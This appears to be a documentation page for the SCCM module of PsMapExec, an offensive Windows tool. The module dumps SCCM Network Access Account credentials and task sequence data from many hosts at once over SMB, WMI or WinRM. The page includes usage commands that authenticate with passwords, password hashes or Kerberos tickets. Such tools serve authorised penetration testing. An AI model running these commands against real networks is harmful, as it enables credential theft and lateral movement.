# SCCM

Dumps local SCCM secrets for Network Access Account credentials and Task sequence data. Collected information is automatically parsed and organized where it will be stored in `$PWD\PME\SCCM\`.

Uses a stripped down and revised version of [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) for execution.

### **Supported Methods**

* SMB&#x20;
* SessionHunter (WMI)
* WMI&#x20;
* WinRM

### **Optional Parameters**

<table><thead><tr><th width="170">Parameter</th><th width="119.33333333333331">Value</th><th>Description</th></tr></thead><tbody><tr><td>-NoParse</td><td>N/A</td><td>Will ommit parsing output from each system.</td></tr><tr><td>-ShowOutput</td><td>N/A</td><td>Displays each targets output to the console</td></tr><tr><td>-SuccessOnly</td><td>N/A</td><td>Display only successful results</td></tr></tbody></table>

### Usage Examples

{% code overflow="wrap" %}
```powershell
# SMB execution with password authentication, targeting workstations
PsMapExec -Targets "Workstations" Method "SMB" -Username [User] -Password [Pass]     -Module SCCM

# WinRM execution with hash authentication, targeting servers
PsMapExec -Targets "Servers" -Username [User] -Hash [RC4/AES256/NTLM] -Module SCCM -Method "WinRM"

# WMI execution with Kerberos ticket authentication (Username not required)
PsMapExec -Targets "All" -Method "WMI" -Ticket [doI..] -Module SCCM
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
